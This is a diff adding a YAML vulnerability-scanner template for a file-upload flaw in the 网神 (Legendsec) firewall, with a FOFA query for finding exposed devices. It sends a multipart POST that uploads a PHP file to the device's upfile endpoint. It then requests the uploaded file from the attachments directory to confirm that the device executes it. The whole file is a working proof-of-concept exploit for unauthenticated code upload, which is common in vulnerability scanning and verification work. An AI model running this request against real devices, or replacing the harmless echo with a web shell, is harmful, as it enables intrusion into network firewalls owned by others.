@@ -1,0 +1,42 @@
+info:
+  vulId: wangshen_fileupload
+  detail: 网神防火墙文件上传漏洞
+  fofaQuery: app="网神-防火墙"
+rules:
+  - request:
+      payload:
+        - "<?php echo '12345678910';?>"
+      path: "{{rootUrl}}/?g=obj_app_upfile"
+      method: POST
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Content-type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+      redirect: false
+      dataType: text
+      data: "------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n10000000\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"f3fCd7C2.php\"\r\nContent-Type: text/plain\r\n\r\n{{payload}}\r\n\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"submit_post\"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"__hash__\"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--"
+    checksCondition: and
+    checks:
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+  - request:
+      path: "{{rootUrl}}/attachements/f3fCd7C2.php"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataType: text
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - 12345678910
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
